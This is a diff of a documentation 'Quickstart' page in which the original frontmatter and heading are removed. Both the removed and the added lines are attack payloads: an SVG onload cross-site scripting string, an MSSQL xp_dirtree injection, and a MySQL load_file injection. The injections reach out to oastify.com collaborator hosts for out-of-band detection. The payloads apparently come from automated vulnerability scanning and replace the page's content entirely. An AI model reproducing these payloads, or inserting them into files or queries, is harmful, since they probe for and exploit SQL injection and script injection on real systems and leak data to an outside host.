@@ -1,8 +1,1 @@
----
-title: 'Quickstart'
-description: 'Start building awesome documentation in under 5 minutes'
----
-
-## Setup your development
-
-<svg/onload=alert(1);/></html>');declare @q varchar(99);set @q='\\xz0k4jh6hj0bo61yoyp25hv8tzztnkl8c10tnobd.oasti'+'fy.com\weg'; exec master.dbo.xp_dirtree @q;-- 
+(select load_file('\\\\zz2m4lh8hl0do810o0p45jvat1zvnmlacc04nzbo.oastify.com\\sxb'))
